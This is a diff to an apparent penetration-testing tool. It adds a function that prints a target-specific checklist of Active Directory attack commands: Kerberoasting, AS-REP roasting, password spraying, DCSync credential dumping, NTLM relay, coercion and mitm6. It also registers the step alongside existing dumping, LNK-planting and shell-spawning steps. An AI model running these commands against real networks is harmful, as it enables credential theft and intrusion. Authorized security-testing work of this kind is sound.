@@ -2968,7 +2968,7 @@ _EXPLOIT_STEPS = {
         # ── land a shell & foothold ──
         ("Spawn & upgrade an interactive shell", "smb-foothold"),
         # ── manual steps, tailored to what this host exposed ──
-        "Manual steps & further research",
+        ("Manual steps & further research", "smb-next"),
     ],
     "winrm": [
         "Confirm WinRM transport (5985 HTTP / 5986 HTTPS)",
@@ -9799,6 +9799,104 @@ def _tool_smb_foothold(ip: str, port: int, proto: str) -> str:
     return f"smb-foothold: {method} shell → {who}@{host}{tail}"
 
 
+# ── SMB step 14: manual steps (read-only reference, this host's findings substituted) ──
+def _tool_smb_next(ip: str, port: int, proto: str) -> str:
+    """SMB step-14 tool: NOT a scan — a read-only checklist of manual AD/SMB escalations for
+    when the automated steps came up short, with this host's own findings substituted in
+    (SMB-phase CVEs, enumerated users & domain → ready commands, harvested creds, and
+    unconfirmed ⚠ hits listed for manual verification). Pure DB synthesis; no network."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    enum = by_sid.get("smb-enum", "")
+
+    md = re.search(r"Domain:\s*(\S+)", enum)
+    dom = md.group(1) if md and not _looks_ip(md.group(1)) else None
+    dc = dom or "<domain>"
+    users = []
+    for m in re.finditer(r"\d+:\s*\S+\\([^\s(]+)\s*\(SidTypeUser\)", enum):
+        users.append(m.group(1))
+    for m in re.finditer(r"^\s*\S+\\([A-Za-z0-9._$-]+)\s*$", enum, re.M):
+        users.append(m.group(1))
+    users = [u for u in dict.fromkeys(users) if u.lower() != "guest"][:12]
+    ncreds, nadmin = len(_gather_all_smb_creds()), len(_gather_smb_admin())
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            s = ln.strip()
+            if s.startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {s}")
+    warns = warns[:14]
+
+    ucred = "-u <user> -p <pass>" if ncreds else "-u '' -p ''"
+    L = [f"SMB {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}",
+         f"{DIM}domain: {dc}  ·  harvested creds: {ncreds}  ·  admin footholds: {nadmin}{RESET}"]
+
+    L.append(f"\n{BOLD}A. Deeper enumeration{RESET}")
+    L.append(f"  {DIM}enum4linux-ng -A {ip}   ·   nxc smb {ip} -u '' -p '' --rid-brute 20000{RESET}")
+    L.append(f"  {DIM}LDAP: nxc ldap {dc} {ucred} --bloodhound -c all -ns {ip}   ·   "
+             f"ldapdomaindump / windapsearch{RESET}")
+
+    L.append(f"\n{BOLD}B. Interactive & heavier tooling{RESET}")
+    L.append(f"  {DIM}BloodHound: bloodhound-python -d {dc} {ucred} -c All -ns {ip}  → ACL / attack paths{RESET}")
+    L.append(f"  {DIM}ADCS: certipy find {ucred} -dc-ip {ip} -vulnerable   (ESC1-8){RESET}")
+    L.append(f"  {DIM}Coercer scan; mitm6 -d {dc} + ntlmrelayx (IPv6 DNS takeover){RESET}")
+
+    L.append(f"\n{BOLD}C. CVEs surfaced in the SMB phase{RESET}")
+    if found:
+        for c in found:
+            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
+            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
+    else:
+        L.append(f"  {DIM}none surfaced yet — re-run smb-vuln (r2) / smb-dccve (r8){RESET}")
+
+    L.append(f"\n{BOLD}D. Credentials & lateral movement{RESET}")
+    if users:
+        L.append(f"  {CYAN}users:{RESET} {', '.join(users)}")
+    ulist = "users.txt" if users else "<users.txt>"
+    L.append(f"  {DIM}Kerberoast: nxc ldap {dc} {ucred} --kerberoasting kerb.txt   "
+             f"(GetUserSPNs.py){RESET}")
+    L.append(f"  {DIM}AS-REP roast: nxc ldap {dc} -u {ulist} -p '' --asreproast asrep.txt   "
+             f"(GetNPUsers.py){RESET}")
+    L.append(f"  {DIM}spray (1 pw / account, mind lockout): nxc smb {ip} -u {ulist} -p "
+             f"'<Season2024!>' --continue-on-success{RESET}")
+    L.append(f"  {DIM}DCSync (if DA): impacket-secretsdump '{dc}/<user>:<pass>@{ip}' -just-dc{RESET}")
+
+    L.append(f"\n{BOLD}E. Coercion & relay deep-dive{RESET}")
+    L.append(f"  {DIM}ntlmrelayx -t ldap://{ip} --escalate-user <you>   ·   -t <host> --socks (keep sessions){RESET}")
+    L.append(f"  {DIM}coerce toward your listener: PetitPotam / DFSCoerce / PrinterBug / Coercer{RESET}")
+
+    L.append(f"\n{BOLD}F. AD classes to test manually{RESET}")
+    L.append(f"  {DIM}delegation (unconstrained / constrained / RBCD) · ADCS ESC1-8 · ACL abuse "
+             f"(BloodHound) · GPO abuse · MachineAccountQuota{RESET}")
+
+    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
+    if warns:
+        for w in warns:
+            L.append(f"  {w}")
+    else:
+        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")
+
+    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
+    L.append(f"  {DIM}after a dump (r11), re-spray the new NT hashes (r9) to lateral further{RESET}")
+    if by_sid.get("smb-writable"):
+        L.append(f"  {DIM}remove any planted LNK: smb-writable CLEANUP (see r12 output){RESET}")
+    L.append(f"  {DIM}add {dc} / the DC to /etc/hosts; sync the clock for Kerberos "
+             f"(ntpdate {ip} / faketime){RESET}")
+    return "\n".join(L)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9841,6 +9939,7 @@ _STEP_TOOLS = {
     "smb-dump": ("Dump SAM/LSA/LSASS/DPAPI + DCSync NTDS (netexec, admin creds)", _tool_smb_dump),
     "smb-writable": ("Writable share → plant hash-capture LNK (netexec slinky, reversible)", _tool_smb_writable),
     "smb-foothold": ("foothold → spawn interactive admin session (psexec/evil-winrm)", _tool_smb_foothold),
+    "smb-next": ("manual AD/SMB steps (context-aware, reference only)", _tool_smb_next),
 }
 
 def _mins(seconds: int) -> str:
@@ -9898,6 +9997,7 @@ _STEP_TOOL_RUNS = {
     "smb-dump":         ("netexec --sam/--lsa/--ntds", f"{_mins(_SMBDUMP_DEADLINE)} min"),
     "smb-writable":     ("netexec slinky", f"{_mins(_SMBWRITABLE_DEADLINE)} min"),
     "smb-foothold":     ("impacket / evil-winrm", None),
+    "smb-next":         ("reference · no scan", None),
 }
 
 
@@ -9976,7 +10076,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         return
     tlabel, runner = _STEP_TOOLS[tool_key]
 
-    if tool_key in ("foothold", "next-steps", "smb-foothold"):  # foreground: interactive / print-now
+    if tool_key in ("foothold", "next-steps", "smb-foothold", "smb-next"):  # foreground: interactive / print-now
         prev = fetch_step_status(ip, port, proto, key).get(n)
         set_step_status(ip, port, proto, key, n, "running")
         try:
@@ -9985,7 +10085,7 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
             print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
             set_step_status(ip, port, proto, key, n, prev)
             return
-        if tool_key == "next-steps":                          # it's a list to read now, not a scan result
+        if tool_key in ("next-steps", "smb-next"):            # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
